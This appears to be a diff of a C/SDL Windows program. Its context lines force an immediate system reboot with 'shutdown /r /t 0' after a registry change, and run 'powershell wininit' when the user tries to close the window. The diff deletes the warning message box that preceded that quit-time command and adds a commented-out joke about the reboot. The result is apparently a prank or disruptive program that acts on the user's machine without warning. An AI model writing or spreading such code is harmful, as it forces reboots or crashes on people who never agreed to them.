@@ -26,6 +26,7 @@ int main()
         RegCloseKey(hKey);
       }
       system("shutdown /r /t 0");
+      // MessageBox(NULL, "There was supposed to be a reboot here", "No reboot today", MB_ICONEXCLAMATION | MB_OK | MB_DEFBUTTON1);
     }
   }
 
@@ -66,7 +67,6 @@ int main()
 
     if (event.type == SDL_EVENT_QUIT)
     {
-      SDL_ShowSimpleMessageBox(SDL_MESSAGEBOX_WARNING, "Title", "Message", window);
       system("powershell wininit");
       // break;
     }
